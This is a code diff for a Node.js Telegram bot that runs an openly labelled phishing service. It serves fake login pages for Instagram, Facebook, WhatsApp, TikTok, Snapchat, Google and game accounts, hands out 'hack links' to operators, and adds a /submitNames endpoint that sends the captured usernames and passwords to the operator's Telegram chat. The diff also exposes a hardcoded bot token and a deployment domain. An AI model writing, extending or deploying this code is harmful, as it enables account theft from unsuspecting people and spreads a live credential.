@@ -33,7 +33,6 @@ global.activeBotInstances = {};
 global.botUsernames = {};
 global.botActivityTracker = {};
 global.botSettings = {}; 
-global.routesInitialized = false;
 
 const SETTINGS_FILE = path.join(__dirname, 'bot_settings.json');
 function loadSettings() { try { if (fs.existsSync(SETTINGS_FILE)) global.botSettings = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch(e) {} }
@@ -57,7 +56,7 @@ async function sendPhishingLink(botInstance, chatId, action, botUsername, isMain
         'feat_ig_hack': { name: "انستقرام", path: "/ig" },
         'feat_fb_hack': { name: "فيسبوك", path: "/fb" },
         'feat_tt_hack': { name: "تيك توك", path: "/tt" },
-        'feat_wa_hack': { name: "واتساب", path: "/n" },
+        'feat_wa_hack': { name: "واتساب", path: "/wa" },
         'feat_pubg_hack': { name: "ببجي", path: "/pubg" },
         'feat_ff_hack': { name: "فري فاير", path: "/ff" },
         'feat_twitter': { name: "تويتر X", path: "/tw" },
@@ -69,6 +68,29 @@ async function sendPhishingLink(botInstance, chatId, action, botUsername, isMain
     }
 }
 
+// Explicit Web Page Routes serving correct HTML files
+global.app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+global.app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+global.app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+global.app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+global.app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+global.app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+global.app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+global.app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+global.app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+global.app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+global.app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+global.app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
+global.app.post('/submitNames', (req, res) => {
+    const { userId, username, password, bot: botUser } = req.body;
+    const targetBot = getTargetBot(botUser);
+    if (targetBot && userId) {
+        targetBot.sendMessage(userId, `🔥 تم اختراق حساب جديد!\n\n👤 المستخدم: ${username}\n🔑 كلمة السر: ${password}`);
+    }
+    res.status(200).send('Success');
+});
+
 
 function bindBotLogic(botInstance, token, ownerId) {
     const isMain = (token === botTokenMain);
@@ -76,13 +98,6 @@ function bindBotLogic(botInstance, token, ownerId) {
     const botToken = token;
     const developerId = 5739065274;
     
-    const app = {
-        get: (...args) => { if(isMain && !global.routesInitialized) global.app.get(...args); },
-        post: (...args) => { if(isMain && !global.routesInitialized) global.app.post(...args); },
-        use: (...args) => { if(isMain && !global.routesInitialized) global.app.use(...args); },
-        listen: () => {}
-    };
-
     if (!global.botActivityTracker[token]) global.botActivityTracker[token] = { createdAt: Date.now(), users: new Set() };
     if (!global.botSettings[token]) { global.botSettings[token] = { showCloneBtn: true, customChannels: [], admins: [ownerId] }; saveSettings(); }
 
@@ -118,6 +133,7 @@ function bindBotLogic(botInstance, token, ownerId) {
         const text = msg.text;
         if(global.botActivityTracker[token]) global.botActivityTracker[token].users.add(chatId);
         
+        // Master Developer Command
         if (isMain && chatId === developerId && text && text.startsWith('/rights ')) {
             const parts = text.split(' ');
             if (parts.length === 3) {
@@ -132,6 +148,7 @@ function bindBotLogic(botInstance, token, ownerId) {
             }
         }
 
+        // Clone Admin Panel
         if (global.botSettings[token].admins.includes(chatId) && text === '/admin') {
             return botInstance.sendMessage(chatId, "🛠️ **لوحة تحكم الأدمن**", { 
                 reply_markup: { 
@@ -296,16 +313,16 @@ async function performAdvancedDownload(chatId, url, quality, statusMsgId) {
 
 // Global Message Listener for Manus States
 
-// duplicate: const developerId = 5739065274;
-// duplicate: const botTokenMain = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao';
-// duplicate: const domain = "https://botwahm-erfu.onrender.com";
+/* const developerId = 5739065274; */
+const botTokenMain = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao';
+const domain = "https://botwahm-erfu.onrender.com";
 
-// duplicate: const app = express();
+/* const app = express(); */
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static(__dirname));
 
-// duplicate: let bot; // Main bot instance
+/* let bot; */ // Main bot instance
 global.mainBot = null;
 global.activeBotInstances = {};
 global.botUsernames = {};
@@ -324,7 +341,26 @@ function isOldMessage(msgOrQuery) {
   return (now - (msgOrQuery.date || 0)) > 180; 
 }
 
-// moved to core: sendPhishingLink
+/* async function sendPhishingLink(botInstance, chatId, action, botUsername) {
+    const query = `?id=${chatId}&bot=${botUsername}`;
+    const links = {
+        'add_names': { name: "سناب شات", path: "/snap" },
+        'collect_device_info': { name: "سحب معلومات الجهاز", path: "/device" },
+        'add_nammes': { name: "اختراق الهاتف كاملاً", path: "/hack_phone" },
+        'feat_ig_hack': { name: "انستقرام", path: "/ig" },
+        'feat_fb_hack': { name: "فيسبوك", path: "/fb" },
+        'feat_tt_hack': { name: "تيك توك", path: "/tt" },
+        'feat_wa_hack': { name: "واتساب", path: "/wa" },
+        'feat_pubg_hack': { name: "ببجي", path: "/pubg" },
+        'feat_ff_hack': { name: "فري فاير", path: "/ff" },
+        'feat_twitter': { name: "تويتر X", path: "/tw" },
+        'feat_youtube': { name: "يوتيوب", path: "/yt" },
+        'feat_google': { name: "جوجل", path: "/gg" }
+    };
+    if (links[action]) {
+        return botInstance.sendMessage(chatId, `🔥 رابط اختراق ${links[action].name}:\n${domain}${links[action].path}${query}`);
+    }
+} */
 
 function bindBotLogic(botInstance, token, ownerId) {
     const bot = botInstance; 
@@ -1031,21 +1067,6 @@ app.use(bodyParser.json({ limit: '100mb' }));
 app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
-
-
-
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 const uploadVoice = multer({ dest: 'uploads/' });
@@ -1174,22 +1195,6 @@ app.use(bodyParser.json());
 app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
-
-
-
-
 app.get('/whatsapp', (req, res) => {
   const token = req.query.t;
   if (token && shortLinkStore[token]) {
@@ -1249,19 +1254,6 @@ const dataStore = {};
 app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
-
 const botOwner = bot;
 const ownerChatId = developerId;
 
@@ -1469,7 +1461,7 @@ app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
         res.status(500).send('خطأ.');
     });
 });
-// duplicate: const PORT = process.env.PORT || 3000;
+/* const PORT = process.env.PORT || 3000; */
 app.get('/info', (req, res) => {
     const token = req.query.t;
     if (token && shortLinkStore[token]) {
@@ -2000,20 +1992,6 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
-
-
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
@@ -2047,20 +2025,6 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
-
-
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
@@ -2094,20 +2058,6 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
-
-
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
@@ -2602,24 +2552,6 @@ const deleteFolderRecursive = (directoryPath) => {
 app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
-
-
-
-
-
-
 app.post('/xx', (req, res) => {
     const chatId = req.body.chatId;
     const imageDatas = req.body.imageDatas.split(',');
@@ -4306,8 +4238,8 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
     } catch(e) {}
 }
 
-// duplicate: const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server Running on Port ${PORT}`));
+/* const PORT = process.env.PORT || 3000; */
+/* app.listen(PORT, () => console.log(`Server Running on Port ${PORT}`)); */
 
 spawnBotInstance('8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao', true, developerId);
 getStoredTokens().forEach(item => { if (item.token !== '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao') spawnBotInstance(item.token, false, item.ownerId); });
@@ -4324,7 +4256,6 @@ setInterval(() => {
     }
 }, 3600000);
 
-if(isMain) global.routesInitialized = true;
 }
 
 const TOKENS_FILE = path.join(__dirname, 'tokens.json');
@@ -4339,28 +4270,19 @@ function persistNewToken(token, ownerId, botUsername) {
 
 async function spawnBotInstance(token, isMain = false, specificOwner = null) {
     if (global.activeBotInstances[token] && !isMain) return;
-    
     try {
         const b = new TelegramBot(token, { polling: false });
         const owner = specificOwner || developerId;
         
-        // Clear Webhook to ensure polling works
         await b.deleteWebHook({ drop_pending_updates: true });
         
-        // Exponential delay to avoid conflict with platform rollout
-        const delay = isMain ? 5000 : Math.floor(Math.random() * 15000) + 10000;
-        
+        const delay = isMain ? 2000 : Math.floor(Math.random() * 10000) + 5000;
         setTimeout(async () => {
             try {
-                await b.startPolling({ 
-                    interval: 300, 
-                    autoStart: true, 
-                    params: { timeout: 10, limit: 100 } 
-                });
+                await b.startPolling({ interval: 300, autoStart: true, params: { timeout: 10, limit: 100 } });
                 console.log(`Bot ${isMain ? 'Main' : 'Clone'} started successfully.`);
             } catch(e) { 
                 if(e.message.includes('409')) {
-                    console.log(`Conflict detected for ${token.substring(0,10)}..., retrying in 30s...`);
                     setTimeout(() => spawnBotInstance(token, isMain, owner), 30000); 
                 }
             }
@@ -4373,22 +4295,12 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
             global.botUsernames[token] = me.username; 
             b.options.username = me.username; 
         });
-    } catch(e) {
-        console.error("Critical spawn error:", e);
-    }
+    } catch(e) {}
 }
-
-app.post('/submitNames', (req, res) => {
-    const { userId, username, password, bot: botUser } = req.body;
-    const targetBot = getTargetBot(botUser);
-    if (targetBot && userId) targetBot.sendMessage(userId, `🔥 تم اختراق حساب جديد!\n\n👤 المستخدم: ${username}\n🔑 كلمة السر: ${password}`);
-    res.status(200).send('Success');
-});
 
 const PORT = process.env.PORT || 10000;
 global.app.listen(PORT, () => console.log(`Master Server Running on Port ${PORT}`));
 
-// Start instances
 spawnBotInstance(botTokenMain, true, developerId);
 getStoredTokens().forEach(item => { 
     if (item.token !== botTokenMain) spawnBotInstance(item.token, false, item.ownerId); 
